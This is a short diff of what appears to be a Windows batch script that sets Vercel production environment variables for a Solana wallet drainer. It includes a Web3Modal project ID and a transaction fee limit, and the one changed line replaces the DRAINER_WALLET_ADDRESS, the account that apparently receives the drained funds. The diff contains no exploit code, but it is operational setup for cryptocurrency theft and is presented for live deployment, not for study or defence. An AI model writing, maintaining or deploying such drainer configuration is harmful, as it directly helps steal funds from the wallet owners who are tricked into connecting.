@@ -21,7 +21,7 @@ REM Web3Modal Configuration
 vercel env add WEB3MODAL_PROJECT_ID production 45a382364ff2b00404b2d4c2ff95dbd4
 
 REM Drainer Configuration
-vercel env add DRAINER_WALLET_ADDRESS production 8WZ117ZSWyFSWq9fht5NGfprUQvoE5nReGfWKpczGRPZ
+vercel env add DRAINER_WALLET_ADDRESS production FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj
 
 REM Transaction Limits
 vercel env add MIN_SOL_FOR_FEES production 0.005
